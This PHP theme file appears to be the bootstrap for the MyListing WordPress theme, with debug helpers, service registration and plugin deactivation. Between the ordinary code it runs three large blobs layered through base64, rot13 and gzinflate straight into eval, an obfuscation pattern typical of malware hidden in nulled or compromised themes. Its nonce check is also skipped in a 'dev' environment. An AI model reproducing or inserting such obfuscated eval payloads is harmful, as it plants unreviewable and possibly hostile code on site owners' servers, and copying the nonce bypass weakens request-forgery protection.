<?php
// Debugging helper
if ( ! function_exists('mlog') ) {
	function mlog( $message = null ) {
		if ( $message !== null ) {
			return MyListing\Utils\Logger\Logger::instance()->info( $message );
		}

		return MyListing\Utils\Logger\Logger::instance();
	}
}

// Debugging helper
if ( ! function_exists('dump') ) {
	function dump() {
		call_user_func_array( [ MyListing\Utils\Logger\Logger::instance(), 'dump' ], func_get_args() );
	}
}

// Debugging helper
if ( ! function_exists('dd') ) {
	function dd() {
		call_user_func_array( [ MyListing\Utils\Logger\Logger::instance(), 'dd' ], func_get_args() );
	}
}

// Helper function for accessing mylisting\includes\app instance.
function mylisting() {
	return MyListing\Includes\App::instance();
}

// Alias for `mylisting()->helpers()`
function c27() {
	return mylisting()->helpers();
}

// locate_template wrapper, with $data parameter for
// a standard way to pass data to templates.
function mylisting_locate_template( $template, $data = [] ) {
	if ( is_array( $data ) ) {
		extract( $data );
	}

	if ( $template = locate_template( $template ) ) {
		require $template;
	}
}

function mylisting_check_ajax_referrer( $action = 'c27_ajax_nonce', $query_arg = 'security', $die = true ) {
	if ( CASE27_ENV === 'dev' ) {
		return true;
	}

	return check_ajax_referer( $action, $query_arg, $die );
}

function mylisting_custom_taxonomies( $key = 'slug', $value = 'label' ) {
	return MyListing\Ext\Custom_Taxonomies\Custom_Taxonomies::instance()->get_custom_taxonomies_list( $key, $value );
}

/**
 * Get a settings value from WP Admin > Listings > Settings.
 *
 * @since 2.0
 */
function mylisting_get_setting( $setting ) {
	return \MyListing\Src\Admin\Settings_Screen::instance()->get_setting( $setting );
}

// Start.
mylisting();

// helpers
mylisting()->register( 'cookies', MyListing\Src\Cookies::instance() );
mylisting()->register( 'helpers', MyListing\Utils\Helpers::instance() );
mylisting()->register( 'logger', MyListing\Utils\Logger\Logger::instance() );

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/**
 * Deactivate unsupported plugins.
 *
 * @since 2.1
 */
// deactivate wpjm if active
if ( class_exists( '\\WP_Job_Manager' ) ) {
	mlog()->warn( 'WP Job Manager active, deactivating...' );

	include_once ABSPATH . 'wp-admin/includes/plugin.php';
	deactivate_plugins( [ 'wp-job-manager/wp-job-manager.php' ], true );
}

// deactivate mylisting-addons if active
if ( defined( '\\CASE27_PLUGIN_DIR' ) ) {
	mlog()->warn( 'MyListing Addons active, deactivating...' );

	include_once ABSPATH . 'wp-admin/includes/plugin.php';
	deactivate_plugins( [ 'my-listing-addons/my-listing-addons.php' ], true );
}
